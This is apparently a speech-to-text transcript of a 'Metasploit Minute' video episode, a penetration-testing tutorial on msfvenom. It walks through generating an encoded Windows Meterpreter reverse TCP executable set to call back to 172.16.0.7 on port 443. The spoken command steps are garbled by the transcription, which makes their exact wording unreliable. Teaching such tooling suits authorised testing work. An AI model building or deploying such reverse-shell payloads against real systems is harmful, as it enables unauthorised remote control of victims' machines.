Metasploit minute is brought to you by
viewers like you
if you get value from this show and can
spare even a dollar please consider
contributing at Metasploit minute calm
welcome to Metasploit minute the
breakdown on breaking in I'm your host
Rob fuller but you can call me movements
today we're going to be going over MSF
venom is the granddaddy or the the
daughter or father or however you want
to say it of MSF payload and MSF encode
they have merged those two scripts into
singular the developers from Metasploit
have merged that into a single script
and the reason why we're going over this
today is because unfortunately MSF
payload and MSF encode are going away in
2015 on June 8 it is gone it's going
away and it's a payload an MSF encode
are out of there so if you have a book
or script or or how to cheat seat with
MSF payload and MSF and code on it you
can no longer use those things as of
June of next year or 2015 this year I
guess that would be so we're going to be
going over in this episode how to use
MSF venom so Asif venom is in the exact
same directory that MSF payload address
of encode is and you just do MSF in
venom and it should give you a bunch of
options there we go so we have all of
these options available to us and just
to generate a standard reverse TCP
payload we're going to type in MSF venom
- P for payload windows meterpreter
reverse tcp then we are going to set our
architecture to x86 this is important
you have to set this as well as our
encoder - x86 she got
nyeeeeehhh Sagat agony so that's the
default encoder that is used in in most
of the most of the MSF payloads and MSM
encoding that you see on the net because
it is great encoder then we say we have
our architecture we have our encoder and
we want our format is next so exc we
want it to output an exe format and then
finally we say el host and we can - we
can do a - Oh even with all these
options already set we can do a - oh and
it'll tell us what the options are for
this specific payload so takes a second
but it'll get there so we can see that
el host el port and exit func are the
ones that we have so we do a el host we
get rid of that - Oh al host equals
172.16.0.0 7l port equals four four
three we just tell it to pipe into Bobby
XE and that's really it all you do is
change the different options for
whatever payload you want and whatever
encoding you want this for some reason
is not working why is it not working so
if you spell Chicago gun I correctly
Chicago die in such a god I good I like
a stupid guy gene I am it actually works
so we have our LS we have an auto l port
it encodes it correctly and we type file
on our Bobby XE and it hopefully is a
acid why is file taking so long
something's going on with my shell
prompt so it's a PE executable it should
work just fine if we copy this over and
like I said you could use any other
payload you want set up your options
spell your encoder correctly and set up
your options and pipe it to whatever
file type you have and then you're done
that's msfn in a nutshell and it's
really easier to use than the
combination of the two because
you don't have to worry about how to
pipe a file into from MSI payload over
to encode and that's it
so tell me what you think at MSF at hak5
org and stay tuned to Metasploit minute
